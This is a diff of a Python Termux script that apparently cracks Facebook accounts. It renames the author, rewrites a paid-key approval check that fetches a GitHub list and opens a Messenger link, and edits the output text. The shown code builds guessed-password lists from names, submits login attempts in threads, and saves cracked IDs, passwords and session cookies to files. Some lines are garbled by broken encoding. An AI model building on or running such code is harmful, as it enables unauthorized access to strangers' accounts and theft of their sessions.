@@ -1,4 +1,4 @@
-#coding by ALEN XESAN
+#coding by md alif
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -121,52 +121,44 @@ def jalan(z):
         time.sleep(0.01)
         
         
-def main_apv():
-
-    imt="OKAY-BYE"
-
-    ak="ALEN-XESAN"
-
-    os.system('clear')
-
-    print(logo)
-
-    try:
-
-        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
-    except IOError:
-        os.system("clear")
-        print(logo)
-        print ("ï¿½ï¿½")
-        print ("YOUR TOKEN IS NOT APROVAL")     
-        print ("         THIS IS YOUR TOKEN")
-        print ("ï¿½ï¿½")
-        print ("")
-        myid=uuid.uuid4().hex[:10].upper()
-        print ("          YOUR KEY : "+ak+myid+imt)
-        print ("ï¿½ï¿½")
-        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
-        kok.write(myid+imt)
-        kok.close()
-        print ("")
-        print ("")
-        print ("  Copy Key And Sent Me on MESSENGER to Approvel Your Key ")
-        print ("ï¿½ï¿½")
-        time.sleep(3.5)
-        tks = 'Dear%20ALEN SIR,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
-
-        os.system('am start https://m.me/ALEN.OKH' + tks)
-
-        
-
-    r1=requests.get("https://github.com/XESAN-VAU/RANDOM-FIRE-APPROVAL/blob/main/FIRE.txt").text
-
-    if key1 in r1:
-
-        R()
-
+def approval():
+  os.system('clear')
+  banner()
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "4h".join(uuid)
+  try:
+    httpCaht = requests.get('https://github.com/XESAN-VAU/RANDOM-FIRE-APPROVAL/blob/main/FIRE.txt').text
+    if id in httpCaht:
+      print("\33[1;32mYour Token is Successfully Approved")
+      print('\033[1;93mYour Token is Successfully Approved ')
+      psb('\033[1;92m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION BY ALEN XESAN ')
+      msg = str(os.geteuid())
+      time.sleep(0.03)
+      print()
+      pass
     else:
-
+      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
+      print("\033[1;97m[\033[92;1m●\033[1;97m] Note : You Are  Not Premium User...! ")         
+      print("\033[1;97m[\033[92;1m●\033[1;97m] \033[1;97mYour Key \033[38;5;196mNot Registered ")                             
+      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
+      print("\033[1;97m[\033[92;1m●\033[1;97m] Tools... :\033[92;1m Facebook Cloning ")
+      print('\033[1;97m[\033[92;1m●\033[1;97m] Status   :\033[38;5;196m Trail')
+      print("\033[1;97m[\033[92;1m●\033[1;97m] Your Key :\033[92;1m "+id)
+      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
+      print('\033[1;97m[\033[92;1m●\033[1;97m]\x1b[97m\033[37;41m Note:If You Are Free User Don,t Come Inbox\033[0;m \033[1;97m[\033[92;1m●\033[1;97m]')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] 7-Days Price :\033[92;1m 300 \033[1;97m[\033[92;1m●\033[1;97m] 15-Days Price :\033[92;1m 500 \033[1;97m[\033[92;1m●\033[1;97m]')
+      print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
+      print('\033[1;97m[\033[92;1m●\033[1;97m] Fb Cloning Menu')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] File Create Menu')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] Join Fb Group')
+      print('\033[1;97m[\033[92;1m●\033[1;97m] Exit Menu')                               
+      input('\033[1;97m[\033[92;1mENTER\033[1;97m] Upgrade Tool (\033[92;1mPremium\033[1;97m)  ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://m.me/ALEN.OKH?text='+tks),approval()
+      time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+approval()
         os.system("clear")
   
 logo=(""" 
@@ -278,8 +270,8 @@ def ASRAF():
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [ðŸ’‰] Crack process has been completed')
-	print(' [ðŸ’‰] Ids saved in ok.txt,cp.txt')
+	print(' [+] Crack process has been completed')
+	print(' [+] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 
@@ -326,8 +318,8 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [ALEN-ðŸ’š] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[ðŸ’™]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [ALEN] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m=[ALEN]=COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/ALEN-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
